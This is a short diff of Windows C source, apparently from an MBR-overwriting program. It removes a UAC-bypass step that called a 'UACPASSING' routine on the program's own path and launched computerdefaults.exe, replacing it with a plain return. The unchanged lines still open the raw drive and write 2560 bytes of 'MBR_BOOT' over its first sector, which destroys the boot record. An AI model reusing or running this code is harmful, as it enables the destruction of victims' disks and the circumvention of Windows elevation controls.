@@ -13,11 +13,7 @@ INT APIENTRY WinMain(HINSTANCE hInst, HINSTANCE hInstPrev, PSTR cmdline, int cmd
 	DeviceIoControl(hDrive, IOCTL_DISK_GET_PARTITION_INFO, NULL, 0, &in, sizeof(in), &dw, NULL);
 
 	if (hDrive == INVALID_HANDLE_VALUE) /* not-admin */ {
-		char current_file_path[MAX_PATH];
-		GetModuleFileNameA(NULL, current_file_path, MAX_PATH);
-		UACPASSING(current_file_path);
-		system("start computerdefaults.exe");
-		ExitProcess(-EXIT_FAILURE);
+		return -1;
 	}
 	SetFilePointer(hDrive, 0, 0, FILE_BEGIN);
 	WriteFile(hDrive, MBR_BOOT, 2560, NULL, NULL);
